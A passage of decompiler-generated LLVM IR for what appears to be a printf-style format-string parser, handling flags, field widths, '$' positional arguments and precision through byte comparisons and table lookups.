dec_label_pc_1000e044:                            ; preds = %dec_label_pc_1000e040
  %v0_1000e044 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e044 = add i32 %v0_1000e044, -1
  store i32 %v1_1000e044, i32* %ctr.global-to-local, align 4
  %v2_1000e044 = icmp eq i32 %v1_1000e044, 0
  br i1 %v2_1000e044, label %dec_label_pc_1000e048, label %dec_label_pc_1000e044.dec_label_pc_1000e014_crit_edge

dec_label_pc_1000e044.dec_label_pc_1000e014_crit_edge: ; preds = %dec_label_pc_1000e044
  %v0_1000e014.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_1000e018.pre = load i32, i32* @r7, align 4
  %v0_1000e01c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000e014

dec_label_pc_1000e048:                            ; preds = %dec_label_pc_1000e044, %dec_label_pc_1000e040
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000e04c = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1000e054

dec_label_pc_1000e054:                            ; preds = %dec_label_pc_1000dfe8, %dec_label_pc_1000e048
  %v2_1000e064.pre-phi = phi i32 [ %.pre, %dec_label_pc_1000dfe8 ], [ %v2_1000e010, %dec_label_pc_1000e048 ]
  %storemerge3 = phi i32 [ %v2_1000dfe8, %dec_label_pc_1000dfe8 ], [ %v2_1000e04c, %dec_label_pc_1000e048 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 268500992, i32* @r27, align 4
  store i32 %v2_1000e064.pre-phi, i32* %r3.global-to-local, align 4
  store i32 268632064, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000e074

dec_label_pc_1000e070:                            ; preds = %dec_label_pc_1000e180, %dec_label_pc_1000e204
  %v0_1000e070 = phi i32 [ %v1_1000e204, %dec_label_pc_1000e204 ], [ %v0_1000e168, %dec_label_pc_1000e180 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1000e204 ], [ %stack_var_-84.2, %dec_label_pc_1000e180 ]
  store i32 %v0_1000e070, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e074

dec_label_pc_1000e074:                            ; preds = %dec_label_pc_1000e054, %dec_label_pc_1000e070
  %v0_1000e088 = phi i32 [ %storemerge3, %dec_label_pc_1000e054 ], [ %v0_1000e070, %dec_label_pc_1000e070 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1000e054 ], [ %stack_var_-84.0, %dec_label_pc_1000e070 ]
  %v1_1000e074 = inttoptr i32 %v0_1000e088 to i8*
  %v2_1000e074 = load i8, i8* %v1_1000e074, align 1
  %v3_1000e074 = zext i8 %v2_1000e074 to i32
  store i32 %v3_1000e074, i32* %r0.global-to-local, align 4
  store i32 %v0_1000e088, i32* @r30, align 4
  %v3_1000e07c = icmp eq i8 %v2_1000e074, 42
  br i1 %v3_1000e07c, label %dec_label_pc_1000e084, label %dec_label_pc_1000e094

dec_label_pc_1000e084:                            ; preds = %dec_label_pc_1000e074
  %v0_1000e084 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000e084 = mul i32 %v0_1000e084, -4
  store i32 %v1_1000e084, i32* %r0.global-to-local, align 4
  %v1_1000e088 = add i32 %v0_1000e088, 1
  store i32 %v1_1000e088, i32* @r30, align 4
  %v0_1000e08c = load i32, i32* @r1, align 4
  %v2_1000e08c = add i32 %v0_1000e08c, %v1_1000e084
  store i32 %v2_1000e08c, i32* %r9.global-to-local, align 4
  %v0_1000e090 = load i32, i32* @r29, align 4
  %v2_1000e090 = add i32 %v2_1000e08c, 8
  %v3_1000e090 = inttoptr i32 %v2_1000e090 to i32*
  store i32 %v0_1000e090, i32* %v3_1000e090, align 4
  %v0_1000e0ac.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e094

dec_label_pc_1000e094:                            ; preds = %dec_label_pc_1000e074, %dec_label_pc_1000e084
  %v0_1000e0ac.pre = phi i32 [ %v0_1000e088, %dec_label_pc_1000e074 ], [ %v0_1000e0ac.pre.pre, %dec_label_pc_1000e084 ]
  %v3_1000e094 = load i32, i32* @global_var_10028798, align 4
  store i32 %v3_1000e094, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1000e0ac

dec_label_pc_1000e0a0:                            ; preds = %dec_label_pc_1000e0ac
  %v2_1000e0b0 = icmp sgt i32 %v0_1000e0f8, 4094
  br i1 %v2_1000e0b0, label %dec_label_pc_1000e0a8, label %dec_label_pc_1000e0a4

dec_label_pc_1000e0a4:                            ; preds = %dec_label_pc_1000e0a0
  %v1_1000e0a4 = add i32 %v2_1000e0c4, -48
  store i32 %v1_1000e0a4, i32* @r8, align 4
  br label %dec_label_pc_1000e0a8

dec_label_pc_1000e0a8:                            ; preds = %dec_label_pc_1000e0a0, %dec_label_pc_1000e0a4
  %v0_1000e0b015 = phi i32 [ %v0_1000e0f8, %dec_label_pc_1000e0a0 ], [ %v1_1000e0a4, %dec_label_pc_1000e0a4 ]
  %v1_1000e0a8 = add i32 %v0_1000e128, 1
  store i32 %v1_1000e0a8, i32* @r30, align 4
  br label %dec_label_pc_1000e0ac

dec_label_pc_1000e0ac:                            ; preds = %dec_label_pc_1000e094, %dec_label_pc_1000e0a8
  %v0_1000e0f8 = phi i32 [ 0, %dec_label_pc_1000e094 ], [ %v0_1000e0b015, %dec_label_pc_1000e0a8 ]
  %v0_1000e128 = phi i32 [ %v0_1000e0ac.pre, %dec_label_pc_1000e094 ], [ %v1_1000e0a8, %dec_label_pc_1000e0a8 ]
  %v1_1000e0ac = inttoptr i32 %v0_1000e128 to i8*
  %v2_1000e0ac = load i8, i8* %v1_1000e0ac, align 1
  %v3_1000e0ac = zext i8 %v2_1000e0ac to i32
  store i32 %v3_1000e0ac, i32* %r11.global-to-local, align 4
  %v1_1000e0b4 = mul nuw nsw i32 %v3_1000e0ac, 2
  store i32 %v1_1000e0b4, i32* %r9.global-to-local, align 4
  %v2_1000e0b8 = add i32 %v1_1000e0b4, %v3_1000e094
  %v3_1000e0b8 = inttoptr i32 %v2_1000e0b8 to i16*
  %v4_1000e0b8 = load i16, i16* %v3_1000e0b8, align 2
  %v5_1000e0b8 = zext i16 %v4_1000e0b8 to i32
  store i32 %v5_1000e0b8, i32* %r0.global-to-local, align 4
  %v1_1000e0bc = mul i32 %v0_1000e0f8, 10
  %v1_1000e0c0 = and i32 %v5_1000e0b8, 8
  store i32 %v1_1000e0c0, i32* @r25, align 4
  %v3_1000e0c0 = icmp eq i32 %v1_1000e0c0, 0
  %v2_1000e0c4 = add i32 %v3_1000e0ac, %v1_1000e0bc
  store i32 %v2_1000e0c4, i32* %r9.global-to-local, align 4
  br i1 %v3_1000e0c0, label %dec_label_pc_1000e0cc, label %dec_label_pc_1000e0a0

dec_label_pc_1000e0cc:                            ; preds = %dec_label_pc_1000e0ac
  %v0_1000e0cc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e0cc = add i32 %v0_1000e0cc, -1
  %v2_1000e0cc = inttoptr i32 %v1_1000e0cc to i8*
  %v3_1000e0cc = load i8, i8* %v2_1000e0cc, align 1
  %v4_1000e0cc = zext i8 %v3_1000e0cc to i32
  store i32 %v4_1000e0cc, i32* %r0.global-to-local, align 4
  %v3_1000e0d0 = icmp eq i8 %v3_1000e0cc, 37
  br i1 %v3_1000e0d0, label %dec_label_pc_1000e0d8, label %dec_label_pc_1000e1a0

dec_label_pc_1000e0d8:                            ; preds = %dec_label_pc_1000e0cc
  %v3_1000e0d8 = icmp eq i8 %v2_1000e0ac, 36
  br i1 %v3_1000e0d8, label %dec_label_pc_1000e0e0, label %dec_label_pc_1000e114

dec_label_pc_1000e0e0:                            ; preds = %dec_label_pc_1000e0d8
  %tmp58 = icmp slt i32 %v0_1000e0f8, 1
  br i1 %tmp58, label %dec_label_pc_1000e114, label %dec_label_pc_1000e0e8

dec_label_pc_1000e0e8:                            ; preds = %dec_label_pc_1000e0e0
  %v0_1000e0e8 = load i32, i32* @r26, align 4
  %v3_1000e0e8 = icmp eq i32 %v0_1000e0e8, 0
  %v1_1000e0ec = add i32 %v0_1000e128, 1
  store i32 %v1_1000e0ec, i32* %r10.global-to-local, align 4
  br i1 %v3_1000e0e8, label %dec_label_pc_1000e4b0, label %dec_label_pc_1000e0f4

dec_label_pc_1000e0f4:                            ; preds = %dec_label_pc_1000e0e8
  %v3_1000e0f4 = icmp sgt i32 %v0_1000e0f8, %v0_1000e0e8
  br i1 %v3_1000e0f4, label %dec_label_pc_1000e100, label %dec_label_pc_1000e10c

dec_label_pc_1000e100:                            ; preds = %dec_label_pc_1000e0f4
  store i32 %v0_1000e0f8, i32* @r26, align 4
  br label %dec_label_pc_1000e10c

dec_label_pc_1000e108:                            ; preds = %dec_label_pc_1000e130, %dec_label_pc_1000e128
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000e10c

dec_label_pc_1000e10c:                            ; preds = %dec_label_pc_1000e0f4, %dec_label_pc_1000e100, %dec_label_pc_1000e108
  %v0_1000e10c = phi i32 [ %v0_1000e0cc, %dec_label_pc_1000e108 ], [ %v1_1000e0ec, %dec_label_pc_1000e100 ], [ %v1_1000e0ec, %dec_label_pc_1000e0f4 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1000e108 ], [ %v0_1000e0f8, %dec_label_pc_1000e100 ], [ %v0_1000e0f8, %dec_label_pc_1000e0f4 ]
  br label %dec_label_pc_1000e148

dec_label_pc_1000e114:                            ; preds = %dec_label_pc_1000e0d8, %dec_label_pc_1000e0e0
  %v0_1000e114 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1000e114, 1
  br i1 %tmp59, label %dec_label_pc_1000e128, label %dec_label_pc_1000e11c

dec_label_pc_1000e11c:                            ; preds = %dec_label_pc_1000e114
  %v3_1000e11c = icmp eq i8 %v2_1000e0ac, 109
  br i1 %v3_1000e11c, label %dec_label_pc_1000e1a0, label %dec_label_pc_1000e4b0

dec_label_pc_1000e128:                            ; preds = %dec_label_pc_1000e114
  %v3_1000e128 = icmp ugt i32 %v0_1000e128, %v0_1000e0cc
  br i1 %v3_1000e128, label %dec_label_pc_1000e130, label %dec_label_pc_1000e108

dec_label_pc_1000e130:                            ; preds = %dec_label_pc_1000e128
  %v1_1000e130 = inttoptr i32 %v0_1000e0cc to i8*
  %v2_1000e130 = load i8, i8* %v1_1000e130, align 1
  %v3_1000e130 = zext i8 %v2_1000e130 to i32
  store i32 %v3_1000e130, i32* %r0.global-to-local, align 4
  store i32 %v0_1000e0cc, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000e13c = icmp eq i8 %v2_1000e130, 48
  br i1 %v3_1000e13c, label %dec_label_pc_1000e108, label %dec_label_pc_1000e1a4

dec_label_pc_1000e148:                            ; preds = %dec_label_pc_1000e164, %dec_label_pc_1000e10c
  %v0_1000e168 = phi i32 [ %v0_1000e10c, %dec_label_pc_1000e10c ], [ %v1_1000e168, %dec_label_pc_1000e164 ]
  store i32 %v0_1000e168, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10017220.629 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_1000e158 = inttoptr i32 %v0_1000e168 to i8*
  br label %dec_label_pc_1000e150

dec_label_pc_1000e150:                            ; preds = %dec_label_pc_1000e170, %dec_label_pc_1000e148
  %v1_1000e164 = phi i32 [ %v1_1000e174, %dec_label_pc_1000e170 ], [ 1, %dec_label_pc_1000e148 ]
  %v0_1000e150 = phi i32 [ %v1_1000e154, %dec_label_pc_1000e170 ], [ ptrtoint ([8 x i8]* @global_var_10017220.629 to i32), %dec_label_pc_1000e148 ]
  %v1_1000e150 = inttoptr i32 %v0_1000e150 to i8*
  %v2_1000e150 = load i8, i8* %v1_1000e150, align 1
  %v3_1000e150 = zext i8 %v2_1000e150 to i32
  store i32 %v3_1000e150, i32* %r9.global-to-local, align 4
  %v1_1000e154 = add i32 %v0_1000e150, 1
  store i32 %v1_1000e154, i32* %r11.global-to-local, align 4
  %v2_1000e158 = load i8, i8* %v1_1000e158, align 1
  %v3_1000e158 = zext i8 %v2_1000e158 to i32
  store i32 %v3_1000e158, i32* %r0.global-to-local, align 4
  %v4_1000e15c = icmp eq i8 %v2_1000e158, %v2_1000e150
  br i1 %v4_1000e15c, label %dec_label_pc_1000e164, label %dec_label_pc_1000e170

dec_label_pc_1000e164:                            ; preds = %dec_label_pc_1000e150
  %v0_1000e164 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000e164 = or i32 %v0_1000e164, %v1_1000e164
  store i32 %v2_1000e164, i32* %r6.global-to-local, align 4
  %v1_1000e168 = add i32 %v0_1000e168, 1
  br label %dec_label_pc_1000e148

dec_label_pc_1000e170:                            ; preds = %dec_label_pc_1000e150
  %v1_1000e170 = inttoptr i32 %v1_1000e154 to i8*
  %v2_1000e170 = load i8, i8* %v1_1000e170, align 1
  %v3_1000e170 = zext i8 %v2_1000e170 to i32
  store i32 %v3_1000e170, i32* %r0.global-to-local, align 4
  %v1_1000e174 = mul i32 %v1_1000e164, 2
  store i32 %v1_1000e174, i32* %r10.global-to-local, align 4
  %v3_1000e178 = icmp eq i8 %v2_1000e170, 0
  br i1 %v3_1000e178, label %dec_label_pc_1000e180, label %dec_label_pc_1000e150

dec_label_pc_1000e180:                            ; preds = %dec_label_pc_1000e170
  %v1_1000e180 = add i32 %v0_1000e168, -1
  %v2_1000e180 = inttoptr i32 %v1_1000e180 to i8*
  %v3_1000e180 = load i8, i8* %v2_1000e180, align 1
  %v4_1000e180 = zext i8 %v3_1000e180 to i32
  store i32 %v4_1000e180, i32* %r0.global-to-local, align 4
  %v0_1000e184 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000e184 = and i32 %v0_1000e184, 10
  store i32 0, i32* @r8, align 4
  %v3_1000e18c = icmp eq i8 %v3_1000e180, 37
  %v1_1000e190 = udiv i32 %v1_1000e184, 2
  store i32 %v1_1000e190, i32* %r9.global-to-local, align 4
  %v2_1000e194 = sub nuw nsw i32 -1, %v1_1000e190
  %v3_1000e194 = and i32 %v0_1000e184, %v2_1000e194
  store i32 %v3_1000e194, i32* %r6.global-to-local, align 4
  br i1 %v3_1000e18c, label %dec_label_pc_1000e1a4, label %dec_label_pc_1000e070

dec_label_pc_1000e1a0:                            ; preds = %dec_label_pc_1000e0cc, %dec_label_pc_1000e11c
  store i32 %v0_1000e0cc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e1a4

dec_label_pc_1000e1a4:                            ; preds = %dec_label_pc_1000e130, %dec_label_pc_1000e180, %dec_label_pc_1000e1a0
  %v0_1000e1d8 = phi i32 [ 0, %dec_label_pc_1000e180 ], [ %v0_1000e0f8, %dec_label_pc_1000e130 ], [ %v0_1000e0f8, %dec_label_pc_1000e1a0 ]
  %v1_1000e1e4 = phi i32 [ %v0_1000e168, %dec_label_pc_1000e180 ], [ %v0_1000e128, %dec_label_pc_1000e130 ], [ %v0_1000e128, %dec_label_pc_1000e1a0 ]
  %v0_1000e1e0 = phi i32 [ %v1_1000e154, %dec_label_pc_1000e180 ], [ %v0_1000e0cc, %dec_label_pc_1000e130 ], [ %v0_1000e0cc, %dec_label_pc_1000e1a0 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000e180 ], [ %stack_var_-84.1, %dec_label_pc_1000e130 ], [ %stack_var_-84.1, %dec_label_pc_1000e1a0 ]
  %v1_1000e1a4 = inttoptr i32 %v0_1000e1e0 to i8*
  %v2_1000e1a4 = load i8, i8* %v1_1000e1a4, align 1
  %v3_1000e1a4 = zext i8 %v2_1000e1a4 to i32
  store i32 %v3_1000e1a4, i32* %r0.global-to-local, align 4
  %v3_1000e1a8 = icmp eq i8 %v2_1000e1a4, 42
  br i1 %v3_1000e1a8, label %dec_label_pc_1000e1b0, label %dec_label_pc_1000e1f0

dec_label_pc_1000e1b0:                            ; preds = %dec_label_pc_1000e1a4
  %v0_1000e1b0 = load i32, i32* @r26, align 4
  %v3_1000e1b0 = icmp eq i32 %v0_1000e1b0, 0
  br i1 %v3_1000e1b0, label %dec_label_pc_1000e1e0, label %dec_label_pc_1000e1b8

dec_label_pc_1000e1b8:                            ; preds = %dec_label_pc_1000e1b0
  %v1_1000e1b8 = inttoptr i32 %v1_1000e1e4 to i8*
  %v2_1000e1b8 = load i8, i8* %v1_1000e1b8, align 1
  %v3_1000e1b8 = zext i8 %v2_1000e1b8 to i32
  store i32 %v3_1000e1b8, i32* %r0.global-to-local, align 4
  %v3_1000e1bc = icmp eq i8 %v2_1000e1b8, 36
  br i1 %v3_1000e1bc, label %dec_label_pc_1000e1c4, label %dec_label_pc_1000e4b0

dec_label_pc_1000e1c4:                            ; preds = %dec_label_pc_1000e1b8
  %tmp60 = icmp slt i32 %v0_1000e1d8, 1
  br i1 %tmp60, label %dec_label_pc_1000e4b0, label %dec_label_pc_1000e1cc

dec_label_pc_1000e1cc:                            ; preds = %dec_label_pc_1000e1c4
  %v0_1000e1cc = load i32, i32* %r5.global-to-local, align 4
  %v1_1000e1cc = mul i32 %v0_1000e1cc, -4
  %v1_1000e1d0 = add i32 %v1_1000e1e4, 1
  store i32 %v1_1000e1d0, i32* @r30, align 4
  %v0_1000e1d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000e1d4 = add i32 %v0_1000e1d4, %v1_1000e1cc
  store i32 %v2_1000e1d4, i32* %r9.global-to-local, align 4
  %v2_1000e1d8 = add i32 %v2_1000e1d4, 12
  %v3_1000e1d8 = inttoptr i32 %v2_1000e1d8 to i32*
  store i32 %v0_1000e1d8, i32* %v3_1000e1d8, align 4
  %v0_1000e1f8.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e1ec

dec_label_pc_1000e1e0:                            ; preds = %dec_label_pc_1000e1b0
  %v1_1000e1e0 = add i32 %v0_1000e1e0, 1
  store i32 %v1_1000e1e0, i32* %r0.global-to-local, align 4
  %v4_1000e1e4 = icmp eq i32 %v1_1000e1e0, %v1_1000e1e4
  br i1 %v4_1000e1e4, label %dec_label_pc_1000e1ec, label %dec_label_pc_1000e4b0

dec_label_pc_1000e1ec:                            ; preds = %dec_label_pc_1000e1e0, %dec_label_pc_1000e1cc
  %v0_1000e1f8.pre = phi i32 [ %v1_1000e1e4, %dec_label_pc_1000e1e0 ], [ %v0_1000e1f8.pre.pre, %dec_label_pc_1000e1cc ]
  store i32 -2147483648, i32* @r8, align 4
  br label %dec_label_pc_1000e1f0

dec_label_pc_1000e1f0:                            ; preds = %dec_label_pc_1000e1a4, %dec_label_pc_1000e1ec
  %v0_1000e1f8 = phi i32 [ %v1_1000e1e4, %dec_label_pc_1000e1a4 ], [ %v0_1000e1f8.pre, %dec_label_pc_1000e1ec ]
  %v0_1000e208 = phi i32 [ %v0_1000e1d8, %dec_label_pc_1000e1a4 ], [ -2147483648, %dec_label_pc_1000e1ec ]
  %v0_1000e1f0 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000e1f0 = icmp eq i32 %v0_1000e1f0, 0
  %v1_1000e1f8 = inttoptr i32 %v0_1000e1f8 to i8*
  br i1 %v3_1000e1f0, label %dec_label_pc_1000e1f8, label %dec_label_pc_1000e21c

dec_label_pc_1000e1f8:                            ; preds = %dec_label_pc_1000e1f0
  %v2_1000e1f8 = load i8, i8* %v1_1000e1f8, align 1
  %v3_1000e1f8 = zext i8 %v2_1000e1f8 to i32
  store i32 %v3_1000e1f8, i32* %r0.global-to-local, align 4
  %v3_1000e1fc = icmp eq i8 %v2_1000e1f8, 46
  br i1 %v3_1000e1fc, label %dec_label_pc_1000e204, label %dec_label_pc_1000e214

dec_label_pc_1000e204:                            ; preds = %dec_label_pc_1000e1f8
  %v1_1000e204 = add i32 %v0_1000e1f8, 1
  store i32 %v0_1000e208, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000e070

dec_label_pc_1000e214:                            ; preds = %dec_label_pc_1000e1f8
  store i32 %v0_1000e208, i32* @r31, align 4
  br label %dec_label_pc_1000e21c

dec_label_pc_1000e21c:                            ; preds = %dec_label_pc_1000e1f0, %dec_label_pc_1000e214
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000e214 ], [ %v0_1000e208, %dec_label_pc_1000e1f0 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_1000e220 = load i8, i8* %v1_1000e1f8, align 1
  %v3_1000e220 = zext i8 %v2_1000e220 to i32
  store i32 %v3_1000e220, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_100171c8.630 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e228

dec_label_pc_1000e228:                            ; preds = %dec_label_pc_1000e234, %dec_label_pc_1000e21c
  %v0_1000e234 = phi i32 [ %v1_1000e234, %dec_label_pc_1000e234 ], [ ptrtoint ([9 x i8]* @global_var_100171c8.630 to i32), %dec_label_pc_1000e21c ]
  %v1_1000e228 = inttoptr i32 %v0_1000e234 to i8*
  %v2_1000e228 = load i8, i8* %v1_1000e228, align 1
  %v3_1000e228 = zext i8 %v2_1000e228 to i32
  store i32 %v3_1000e228, i32* %r0.global-to-local, align 4
  %v4_1000e22c = icmp eq i8 %v2_1000e220, %v2_1000e228
  br i1 %v4_1000e22c, label %dec_label_pc_1000dff8, label %dec_label_pc_1000e234

dec_label_pc_1000e234:                            ; preds = %dec_label_pc_1000e228
  %v1_1000e234 = add i32 %v0_1000e234, 1
  %v2_1000e234 = inttoptr i32 %v1_1000e234 to i8*
  %v3_1000e234 = load i8, i8* %v2_1000e234, align 1
  %v4_1000e234 = zext i8 %v3_1000e234 to i32
  store i32 %v4_1000e234, i32* %r0.global-to-local, align 4
  store i32 %v1_1000e234, i32* %r11.global-to-local, align 4
  %v3_1000e238 = icmp eq i8 %v3_1000e234, 0
  br i1 %v3_1000e238, label %dec_label_pc_1000e240, label %dec_label_pc_1000e228

dec_label_pc_1000e240:                            ; preds = %dec_label_pc_1000e234, %dec_label_pc_1000dff8
  %v0_1000e268 = phi i32 [ %v1_1000dff8, %dec_label_pc_1000dff8 ], [ %v0_1000e1f8, %dec_label_pc_1000e234 ]
  %v0_1000e264 = phi i32 [ %v0_1000e234, %dec_label_pc_1000dff8 ], [ %v1_1000e234, %dec_label_pc_1000e234 ]
  %v2_1000e248 = sub i32 %v0_1000e264, ptrtoint ([9 x i8]* @global_var_100171c8.630 to i32)
  store i32 %v2_1000e248, i32* %r9.global-to-local, align 4
  %v2_1000e24c = icmp sgt i32 %v2_1000e248, 1
  br i1 %v2_1000e24c, label %dec_label_pc_1000e26c, label %dec_label_pc_1000e254

dec_label_pc_1000e254:                            ; preds = %dec_label_pc_1000e240
  %v1_1000e254 = inttoptr i32 %v0_1000e268 to i8*
  %v2_1000e254 = load i8, i8* %v1_1000e254, align 1
  %v3_1000e254 = zext i8 %v2_1000e254 to i32
  store i32 %v3_1000e254, i32* %r0.global-to-local, align 4
  %v1_1000e258 = inttoptr i32 %v0_1000e264 to i8*
  %v2_1000e258 = load i8, i8* %v1_1000e258, align 1
  %v3_1000e258 = zext i8 %v2_1000e258 to i32
  store i32 %v3_1000e258, i32* %r9.global-to-local, align 4
  %v4_1000e25c = icmp eq i8 %v2_1000e254, %v2_1000e258
  br i1 %v4_1000e25c, label %dec_label_pc_1000e264, label %dec_label_pc_1000e26c

dec_label_pc_1000e264:                            ; preds = %dec_label_pc_1000e254
  %v1_1000e264 = add i32 %v0_1000e264, 9
  store i32 %v1_1000e264, i32* %r11.global-to-local, align 4
  %v1_1000e268 = add i32 %v0_1000e268, 1
  store i32 %v1_1000e268, i32* @r30, align 4
  br label %dec_label_pc_1000e26c

dec_label_pc_1000e26c:                            ; preds = %dec_label_pc_1000e254, %dec_label_pc_1000e240, %dec_label_pc_1000e264
  %v0_1000e270 = phi i32 [ %v0_1000e264, %dec_label_pc_1000e254 ], [ %v0_1000e264, %dec_label_pc_1000e240 ], [ %v1_1000e264, %dec_label_pc_1000e264 ]
  %v0_1000e26c = phi i32 [ %v0_1000e268, %dec_label_pc_1000e254 ], [ %v0_1000e268, %dec_label_pc_1000e240 ], [ %v1_1000e268, %dec_label_pc_1000e264 ]
  %v1_1000e26c = inttoptr i32 %v0_1000e26c to i8*
  %v2_1000e26c = load i8, i8* %v1_1000e26c, align 1
  %v3_1000e26c = zext i8 %v2_1000e26c to i32
  store i32 %v3_1000e26c, i32* @r7, align 4
  %v1_1000e270 = add i32 %v0_1000e270, 9
  %v2_1000e270 = inttoptr i32 %v1_1000e270 to i8*
  %v3_1000e270 = load i8, i8* %v2_1000e270, align 1
  %v4_1000e270 = zext i8 %v3_1000e270 to i32
  store i32 %v4_1000e270, i32* %r0.global-to-local, align 4
  %v3_1000e274 = icmp eq i8 %v2_1000e26c, 0
  %v1_1000e278 = mul nuw nsw i32 %v4_1000e270, 256
  store i32 %v1_1000e278, i32* %r10.global-to-local, align 4
  br i1 %v3_1000e274, label %dec_label_pc_1000e4b0, label %dec_label_pc_1000e280

dec_label_pc_1000e280:                            ; preds = %dec_label_pc_1000e26c
  %v1_1000e284 = and i32 %v1_1000e278, 1024
  store i32 %v1_1000e284, i32* %r0.global-to-local, align 4
  %v3_1000e284 = icmp eq i32 %v1_1000e284, 0
  store i32 268500992, i32* %r3.global-to-local, align 4
  %v3_1000e290 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1000e290, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100171fc.632 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10017208.631 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e2a0

dec_label_pc_1000e2a0:                            ; preds = %dec_label_pc_1000e304, %dec_label_pc_1000e280
  %v1_1000e2ac = phi i32 [ %v1_1000e304, %dec_label_pc_1000e304 ], [ ptrtoint ([21 x i8]* @global_var_10017208.631 to i32), %dec_label_pc_1000e280 ]
  %v1_1000e2a0 = inttoptr i32 %v1_1000e2ac to i8*
  %v2_1000e2a0 = load i8, i8* %v1_1000e2a0, align 1
  %v3_1000e2a0 = zext i8 %v2_1000e2a0 to i32
  store i32 %v3_1000e2a0, i32* %r0.global-to-local, align 4
  %v4_1000e2a4 = icmp eq i8 %v2_1000e2a0, %v2_1000e26c
  br i1 %v4_1000e2a4, label %dec_label_pc_1000e2ac, label %dec_label_pc_1000e304

dec_label_pc_1000e2ac:                            ; preds = %dec_label_pc_1000e2a0
  %v2_1000e2ac = sub i32 %v1_1000e2ac, ptrtoint ([21 x i8]* @global_var_10017208.631 to i32)
  %tmp61 = icmp slt i32 %v2_1000e2ac, 18
  %brmerge = or i1 %v3_1000e284, %tmp61
  br i1 %brmerge, label %dec_label_pc_1000e2c0, label %dec_label_pc_1000e2bc

dec_label_pc_1000e2bc:                            ; preds = %dec_label_pc_1000e2ac
  %v1_1000e2bc = add i32 %v2_1000e2ac, -2
  br label %dec_label_pc_1000e2c0

dec_label_pc_1000e2c0:                            ; preds = %dec_label_pc_1000e2ac, %dec_label_pc_1000e2bc
  %storemerge = phi i32 [ %v1_1000e2bc, %dec_label_pc_1000e2bc ], [ %v2_1000e2ac, %dec_label_pc_1000e2ac ]
  %v0_1000e2c0 = phi i32 [ %v1_1000e2bc, %dec_label_pc_1000e2bc ], [ %v2_1000e2ac, %dec_label_pc_1000e2ac ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000e2c0 = load i32, i32* @r28, align 4
  %v2_1000e2c0 = add i32 %v1_1000e2c0, 32
  %v3_1000e2c0 = inttoptr i32 %v2_1000e2c0 to i32*
  store i32 %v0_1000e2c0, i32* %v3_1000e2c0, align 4
  store i32 ptrtoint (i32* @global_var_100171fb.633 to i32), i32* %r11.global-to-local, align 4
  %v0_1000e2cc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e2c8

dec_label_pc_1000e2c8:                            ; preds = %dec_label_pc_1000e2c8, %dec_label_pc_1000e2c0
  %v0_1000e2c8 = phi i32 [ %v1_1000e2c8, %dec_label_pc_1000e2c8 ], [ ptrtoint (i32* @global_var_100171fb.633 to i32), %dec_label_pc_1000e2c0 ]
  %v1_1000e2c8 = add i32 %v0_1000e2c8, 1
  %v2_1000e2c8 = inttoptr i32 %v1_1000e2c8 to i8*
  %v3_1000e2c8 = load i8, i8* %v2_1000e2c8, align 1
  %v4_1000e2c8 = zext i8 %v3_1000e2c8 to i32
  store i32 %v4_1000e2c8, i32* %r0.global-to-local, align 4
  store i32 %v1_1000e2c8, i32* %r11.global-to-local, align 4
  %v3_1000e2cc = icmp sgt i32 %v0_1000e2cc.pre, %v4_1000e2c8
  br i1 %v3_1000e2cc, label %dec_label_pc_1000e2c8, label %dec_label_pc_1000e2d4

dec_label_pc_1000e2d4:                            ; preds = %dec_label_pc_1000e2c8
  %v0_1000e2d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000e2d4 = sub i32 %v1_1000e2c8, %v0_1000e2d4
  %v1_1000e2dc = mul i32 %v2_1000e2d4, 2
  store i32 %v1_1000e2dc, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100171ec.634 to i32), i32* %r9.global-to-local, align 4
  %v2_1000e2e4 = add i32 %v1_1000e2dc, ptrtoint (i32* @global_var_100171ec.634 to i32)
  %v3_1000e2e4 = inttoptr i32 %v2_1000e2e4 to i16*
